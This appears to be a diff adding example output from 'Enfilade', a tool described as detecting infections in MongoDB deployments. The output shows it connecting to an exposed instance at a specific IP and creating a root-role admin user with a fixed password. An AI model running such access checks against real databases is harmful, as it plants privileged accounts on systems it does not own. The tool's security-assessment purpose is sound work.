@@ -1,0 +1,42 @@
+
+$ python enfilade.py 125.99.129.99 27017 admin_access_verify
+	--------------------------------------------------------------------
+   
+	   _____  ____________   ___   ___  ____
+	  / __/ |/ / __/  _/ /  / _ | / _ \/ __/
+	 / _//    / _/_/ // /__/ __ |/ // / _/  
+	/___/_/|_/_/ /___/____/_/ |_/____/___/ 
+
+	ENFILADE : A Tool to Detect Potential Infections in MongoDB  Deployments 
+        
+	--------------------------------------------------------------------
+
+
+[#] Checking the <GEOIP> status of the MongoDB instance ......
+[*] MongoDB instance is located in <IN> | <Asia/Kolkata>
+
+[*] MongoDB instance identifier is constructed as: mongodb://125.99.129.99:27017
+
+[*] Validating admin access: checking if MongoDB allows execution for admin commands....
+
+[*] Target : <125.99.129.99:27017>
+[*] Connection established, trying to add user <enfilade> to the <admin> database in the target MongoDB instance ....
+
+[*] Checking if the <admin> database exists on MongoDB instance: <[125.99.129.99:27017]>
+[*] Admin database exists on the MongoDB instance.
+
+[*] ---------------------------------------------------------------------------------
+[*] Trying to add user <enfilade> with password <enfilade> to the MongoDB instance.
+[*] ---------------------------------------------------------------------------------
+
+
+[*] Verifying whether the user <enfilade> has been added or not...enumerating the <[users]>
+
+[*] <[SUCCESS]> user <enfilade> has been successfully added to the MongoDB instance: [125.99.129.99:27017]>
+{u'ok': 1.0, u'users': [{u'_id': u'admin.enfilade', u'db': u'admin', u'user': u'enfilade', u'roles': [{u'db': u'admin', u'role': u'root'}]}]}
+
+[*] -------------------------------------------------------------------------
+[*] Potential high privileges command can be executed on the MongoDB instance.
+[*] --------------------------------------------------------------------------
+
+[*] Request processed successfully ! exiting !
